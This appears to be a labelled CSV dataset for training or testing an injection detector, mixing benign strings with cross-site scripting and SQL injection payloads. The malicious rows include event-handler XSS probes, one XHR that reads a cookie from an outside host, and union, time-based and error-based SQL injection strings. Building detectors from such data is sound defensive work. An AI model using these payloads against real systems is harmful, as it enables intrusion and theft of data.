index,payload,type
15929,"<big draggable=""true"" ondrag=""alert(1)"">test</big>",xss
2524,"-1076 union all select 3959,3959--",sqli
20407,"<video onmouseup=""alert(1)"">test</video>",xss
16622,<dialog id=x tabindex=1 onbeforedeactivate=alert(1)></dialog><input autofocus>,xss
11851,84881293t,benign
1301,"1""   )    )    as rpxd where 4929  =  4929",sqli
1447,1'||  (  select 'omeg' from dual where 4751  =  4751,sqli
14903,55265136t,benign
17930,"<progress onmouseenter=""alert(1)"">test</progress>",xss
20532,"<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",xss
2765,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",sqli
18776,"<style>:target {color:red;}</style><h1 id=x style=""transition:color 1s"" ontransitionend=alert(1)></h1>",xss
17926,"<progress onkeydown=""alert(1)"" contenteditable>test</progress>",xss
18290,"<select onmouseover=""alert(1)"">test</select>",xss
20309,<ul id=x tabindex=1 onfocus=alert(1)></ul>,xss
12645,pa24dan3cea,benign
19530,"<style>@keyframes x{}</style><summary style=""animation-name:x"" onanimationstart=""alert(1)""></summary>",xss
1838,"-2715'   )    )    union all select 8646,8646,8646,8646,8646,8646,8646,8646--",sqli
14829,1364,benign
12040,c/ galvan 98 10?a,benign
15320,<x oncut=alert(1)>copy this! ,xss
18959,"<style>:target {transform: rotate(180deg);}</style><picture id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></picture>",xss
12544,gaile,benign
99,or 'text' > 't',sqli
81,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",sqli
12962,villalgordo del marquesado,benign
1325,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,sqli
17368,"<frame oncut=""alert(1)"" contenteditable>test</frame>",xss
15321,<x ondblclick=alert(1)>double click this! ,xss
14646,lopiano,benign
12183,hwei-lin,benign
17795,<input type=image src=1 onerror=alert(1)>,xss
14565,1.00E+15,benign
12012,sevilla,benign
17774,"<input oncopy=alert(1) value=""XSS"" autofocus>",xss
13521,5.69E+15,benign
594," select * from users where id  =  1 or 1#""@ union select null,version  (    )   -- 1",sqli
20487,' onmouseover=alert(/XSS/),xss
15510,<acronym id=x tabindex=1 ondeactivate=alert(1)></acronym><input id=y autofocus>,xss
19960,"<template oncontextmenu=""alert(1)"">test</template>",xss
18805,"<style>:target {color:red;}</style><nav id=x style=""transition:color 1s"" ontransitionend=alert(1)></nav>",xss
16009,"<blockquote oncontextmenu=""alert(1)"">test</blockquote>",xss
18337,"<slot onbeforecut=""alert(1)"" contenteditable>test</slot>",xss
1134,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,sqli
3257,"1  )   union all select null,null,null,null#",sqli
2243,"-8364'  )   union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#",sqli
19696,"<svg onmousedown=""alert(1)"">test</svg>",xss
267, or 1  =  1 /*,sqli
15501,"<abbr onpaste=""alert(1)"" contenteditable>test</abbr>",xss
14526,encrasar,benign
17631,"<i onkeydown=""alert(1)"" contenteditable>test</i>",xss
2236,"1""  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""piya""  =  ""piya",sqli
16243,"<cite onbeforepaste=""alert(1)"" contenteditable>test</cite>",xss
13365,vilafams,benign
1324,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",sqli
17845,"<plaintext draggable=""true"" ondragstart=""alert(1)"">test</plaintext>",xss
592," select * from users where id  =  1 +$+ union select null,@@VERSION -- 1",sqli
11646,subidor,benign
15714,"<audio onbeforecut=""alert(1)"" contenteditable>test</audio>",xss
17991,"<rb onkeypress=""alert(1)"" contenteditable>test</rb>",xss
12635,38036492n,benign
17744,"<img onpaste=""alert(1)"" contenteditable>test</img>",xss
17906,"<progress draggable=""true"" ondragend=""alert(1)"">test</progress>",xss
18032,"<rp onpaste=""alert(1)"" contenteditable>test</rp>",xss
18527,<strong id=x tabindex=1 onfocusin=alert(1)></strong>,xss
135," select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",sqli
15621,"<area onmousedown=""alert(1)"">test</area>",xss
2334,1   )    )    as gygm where 4024  =  4024,sqli
13831,goble,benign
14569,montell i martinet,benign
15503,"<acronym draggable=""true"" ondragend=""alert(1)"">test</acronym>",xss
2217,"1   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  9255  =  9255",sqli
11947,4.09E+15,benign
1991,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'gsdq'  =  'gsdq",sqli
15936,<big id=x tabindex=1 onbeforedeactivate=alert(1)></big><input autofocus>,xss
18569,<style onfocusout=alert(1) tabindex=1 id=x></style><input autofocus>,xss
14936,lazure,benign
3628,1'  )   as mwpp where 6192  =  6192,sqli
1595,"1  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  8898  =  8898",sqli
20779,"<div id=""104""><svg xmlns=""http://www.w3.org/2000/svg"" id=""foo"">",xss
2361,"-5439"" or 2559  =  4692 and ""dcrf"" like ""dcrf",sqli
19307,"<style>@keyframes x{}</style><audio style=""animation-name:x"" onanimationend=""alert(1)""></audio>",xss
13174,"calle santa pola, 7",benign
15274,33245427p,benign
15738,"<b draggable=""true"" ondragend=""alert(1)"">test</b>",xss
980,"-7371'  )   union all select 4531,4531,4531#",sqli
15145,10459,benign
11761,5arneci052,benign
1033,1  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  3945  =  3945,sqli
13537,5672,benign
11779,childree,benign
2182,"1  )   as ndgd where 2367  =  2367 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
20038,"<tfoot onmouseleave=""alert(1)"">test</tfoot>",xss
20696,"<svg><![CDATA[><image xlink:href=""]]><img src=xx:x onerror=alert(2)//""></svg>//[""'`-->]]>]</div>",xss
20243,<tt id=x tabindex=1 onbeforedeactivate=alert(1)></tt><input autofocus>,xss
16955,"<div draggable=""true"" contenteditable>drag me</div><video ondragover=alert(1) contenteditable>drop here</video>",xss
11558,galindo beneyto,benign
12349,talonera,benign
14360,wildt_feng-chiao@paseotuperro.ke,benign
16531,"<del onbeforepaste=""alert(1)"" contenteditable>test</del>",xss
3076,1'  )   where 4729  =  4729,sqli
2134,"iif  (  3760  =  4785,1,1/0  )  ",sqli
19137,"<style>@keyframes slidein {}</style><thead style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></thead>",xss
2713,"1' where 1031  =  1031 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
18425,"<spacer draggable=""true"" ondragstart=""alert(1)"">test</spacer>",xss
11587,aguinaga achutegui,benign
2583,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",sqli
13028,tenuta,benign
19777,<svg><main onload=alert(1)></main>,xss
1485,"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  5468  =  5468",sqli
387,"admin""or 1  =  1 or """"  =  """,sqli
1310,"-3501""   )    )     )   or   (  6789  =  6990  )  *6990 and    (    (     (  ""jnnc"" like ""jnnc",sqli
11362,"antigua de ancora s/n,",benign
15497,"<abbr onmousemove=""alert(1)"">test</abbr>",xss
3749,1'+  (  select qydm where 6019  =  6019,sqli
17717,"<img draggable=""true"" ondragstart=""alert(1)"">test</img>",xss
484," select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",sqli
13513,"isabelita ruiz, 31",benign
14276,lonnie,benign
13892,15821726a,benign
15862,"<bdi onmouseover=""alert(1)"">test</bdi>",xss
13688,86273903y,benign
3612,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',sqli
20387,"<video onbeforepaste=""alert(1)"" contenteditable>test</video>",xss
494," select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",sqli
150," select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",sqli
1449,"-2314%'   )    )    union all select 4612,4612--",sqli
15539,<address id=x tabindex=1 onactivate=alert(1)></address>,xss
17385,"<frameset draggable=""true"" ondragleave=""alert(1)"">test</frameset>",xss
14246,5.89E+15,benign
1801,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",sqli
1973,-2569' union all select 4484--,sqli
18715,"<style>:target {color: red;}</style><tr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tr>",xss
12119,follosas,benign
13169,konstanc,benign
11521,4135,benign
92," select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",sqli
13264,22997473a,benign
17672,"<iframe onmouseover=""alert(1)"">test</iframe>",xss
16912,"<div draggable=""true"" contenteditable>drag me</div><strong ondrop=alert(1) contenteditable>drop here</strong>",xss
14211,lafayette@vitalhome.hk,benign
15627,"<area onmouseup=""alert(1)"">test</area>",xss
20256,<tt onfocusout=alert(1) tabindex=1 id=x></tt><input autofocus>,xss
15223,ezequas,benign
20604,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,xss
2821,"-8640  )   or elt  (  7657  =  5020,5020  )   and   (  2346  =  2346",sqli
3823,"1 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  # kkmw",sqli
14245,6u33a,benign
12148,somisett,benign
1754,"select count  (  *  )   from generate_series  (  1,5000000  )  --",sqli
16751,"<div draggable=""true"" contenteditable>drag me</div><dialog ondragover=alert(1) contenteditable>drop here</dialog>",xss
13095,15008,benign
117,or 'unusual'   =   'unusual',sqli
12042,holbrook,benign
1738,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,sqli
12323,"calle da unidade, 184 7e",benign
19834,<svg><tfoot onload=alert(1)></tfoot>,xss
16492,<dd id=x tabindex=1 onbeforeactivate=alert(1)></dd>,xss
19323,"<style>@keyframes x{}</style><blink style=""animation-name:x"" onanimationend=""alert(1)""></blink>",xss
11729,rocco-misaki@soybueno.nz,benign
20597,"<IMG SRC=""javascript:alert('XSS');"">",xss
16836,"<div draggable=""true"" contenteditable>drag me</div><meta ondrop=alert(1) contenteditable>drop here</meta>",xss
13310,chinarro,benign
18187,"<samp onmouseleave=""alert(1)"">test</samp>",xss
11793,shakor,benign
14733,73732702s,benign
16380,"<command onkeypress=""alert(1)"" contenteditable>test</command>",xss
352,select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,sqli
3486,"1   )    )    union all select null,null,null,null,null,null,null,null,null--",sqli
11812,linton,benign
1734,"1 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sqli
14570,dans,benign
13447,ranez@sandrasummer.bi,benign
16628,"<dialog onbeforepaste=""alert(1)"" contenteditable>test</dialog>",xss
16023,"<blockquote onmouseup=""alert(1)"">test</blockquote>",xss
922,"1'  )   as rvch where 1863  =  1863 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
2," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",sqli
2584,"iif  (  1539  =  1539,1539,1/0  )  ",sqli
586," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",sqli
12509,armenteros,benign
13376,santibez de bjar,benign
14161,concursado,benign
13069,89c3via,benign
11433,"calle hostieros, 24",benign
1380,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",sqli
17709,<image src=validimage.png onload=alert(1)>,xss
3932,1' where 5060  =  5060,sqli
591," select * from users where id  =  1.%@ union select 1,version  (    )   -- 1",sqli
19579,"<sub draggable=""true"" ondragstart=""alert(1)"">test</sub>",xss
2125,"-3215""  )   union all select 4457,4457,4457,4457,4457#",sqli
19296,"<style>@keyframes x{}</style><acronym style=""animation-name:x"" onanimationstart=""alert(1)""></acronym>",xss
3791,"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'novq'  =  'novq",sqli
58," select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",sqli
15214,6196,benign
12830,pettinge,benign
14761,6572,benign
18499,<strike onblur=alert(1) tabindex=1 id=x></strike><input autofocus>,xss
13912,dennis,benign
12146,vilma,benign
16722,"<div draggable=""true"" contenteditable>drag me</div><canvas ondrop=alert(1) contenteditable>drop here</canvas>",xss
1128,"-8950""   )    )    as uahs where 2113  =  2113 union all select 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",sqli
17395,"<frameset onbeforepaste=""alert(1)"" contenteditable>test</frameset>",xss
1384,"1   )    )     )   union all select null,null,null,null,null,null,null--",sqli
19056,"<style>@keyframes slidein {}</style><footer style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></footer>",xss
1980,"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'acdu'  =  'acdu",sqli
12205,garroch_ista,benign
2816,"1%'   )    )     )   and make_set  (  1543  =  5817,5817  )   and    (    (     (  '%'  =  '",sqli
20518,<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23,xss
55," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",sqli
1610,-7532   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  8332  =  8332,sqli
1963,"-6073""   )    )     )   or 9502  =  2012#",sqli
617," select * from users where id  =  1. <@ union select version  (    )  ,version  (    )   -- 1",sqli
18621,"<style>:target {color: red;}</style><div id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></div>",xss
16959,"<div draggable=""true"" contenteditable>drag me</div><xmp ondragover=alert(1) contenteditable>drop here</xmp>",xss
19227,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menuitem id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></menuitem>",xss
3621,"1 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- wynp",sqli
12384,vadim,benign
431, or 'something' like 'some%',sqli
19458,"<style>@keyframes x{}</style><nobr style=""animation-name:x"" onanimationstart=""alert(1)""></nobr>",xss
1969,"1  )   and elt  (  7425  =  8842,8842  )   and   (  9194  =  9194",sqli
18994,"<style>:target {transform: rotate(180deg);}</style><thead id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></thead>",xss
17446,"<h1 onmouseout=""alert(1)"">test</h1>",xss
13091,shangtia,benign
169,"admin"" or 1  =  1",sqli
1947,1',sqli
20610,"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss
16703,"<div draggable=""true"" contenteditable>drag me</div><bdi ondragover=alert(1) contenteditable>drop here</bdi>",xss
15312,'-alert(1)-',xss
2431,"1,iif  (  1440  =  4612,1,1/0  )  ",sqli
18947,"<style>:target {transform: rotate(180deg);}</style><nextid id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></nextid>",xss
19621,<summary onblur=alert(1) tabindex=1 id=x></summary><input autofocus>,xss
15006,sojuela,benign
12738,38656027l,benign
20080,"<thead draggable=""true"" ondragstart=""alert(1)"">test</thead>",xss
13621,me73ga,benign
13381,4.03E+15,benign
1699,"-4031%"" union all select 9566--",sqli
15779,<base id=x tabindex=1 onfocusin=alert(1)></base>,xss
12206,"calle monte miramar, s/n",benign
1690,-7864 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # twpw,sqli
15406,<body onscroll=alert(1)><br><br><br><br>,xss
18133,"<s draggable=""true"" ondragstart=""alert(1)"">test</s>",xss
11625,estolano boget,benign
19699,"<svg onmousemove=""alert(1)"">test</svg>",xss
18056,"<rt onkeyup=""alert(1)"" contenteditable>test</rt>",xss
2180,"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- mtaq",sqli
13702,6252,benign
13249,t1iesti70,benign
13408,8759,benign
1865,"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
17854,"<plaintext onbeforepaste=""alert(1)"" contenteditable>test</plaintext>",xss
2745,if  (  4735  =  8907  )   select 4735 else drop function qigo--,sqli
18131,"<s draggable=""true"" ondragenter=""alert(1)"">test</s>",xss
13065,vladimirov@saludyfitness.br,benign
11570,igal,benign
18081,"<rtc oncontextmenu=""alert(1)"">test</rtc>",xss
2174,"1  )   where 1513  =  1513 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
2543,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'",sqli
19485,"<style>@keyframes x{}</style><progress style=""animation-name:x"" onanimationend=""alert(1)""></progress>",xss
15821,<basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>,xss
16942,"<div draggable=""true"" contenteditable>drag me</div><title ondrop=alert(1) contenteditable>drop here</title>",xss
14765,almazn cayul,benign
2199,"1'||  (  select 'rask' from dual where 9411  =  9411 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||'",sqli
3181,1%'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   '%'  =  ',sqli
1152,-7859  )   as ipdg where 4413  =  4413 or 9323  =  9323#,sqli
12680,4.42E+15,benign
19640,"<sup draggable=""true"" ondragend=""alert(1)"">test</sup>",xss
15791,"<base onkeypress=""alert(1)"" contenteditable>test</base>",xss
3675,"1'   )    )    and elt  (  6847  =  5874,5874  )   and    (    (   'yspu'  =  'yspu",sqli
18831,"<style>:target {color:red;}</style><section id=x style=""transition:color 1s"" ontransitionend=alert(1)></section>",xss
19987,<textarea onauxclick=alert(1)>XSS</textarea>,xss
17032,<dt id=x tabindex=1 onbeforedeactivate=alert(1)></dt><input autofocus>,xss
18183,"<samp onkeypress=""alert(1)"" contenteditable>test</samp>",xss
2685,"1""  )   as giqb where 4664  =  4664",sqli
2379,"1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'bvdw'  =  'bvdw",sqli
2354,-7786'   )    )    or 9323  =  9323#,sqli
13345,scorziel,benign
904,"1   )    )    as potk where 5040  =  5040 or elt  (  5873  =  5873,sleep  (  5   )    )   #",sqli
12406,poca urzagaste,benign
14272,9.11E+14,benign
20342,<var id=x tabindex=1 onfocusin=alert(1)></var>,xss
1068,"1""  )   and   (  3020  =  3020  )  *6703 and   (  ""hkjf""  =  ""hkjf",sqli
18150,"<s onkeydown=""alert(1)"" contenteditable>test</s>",xss
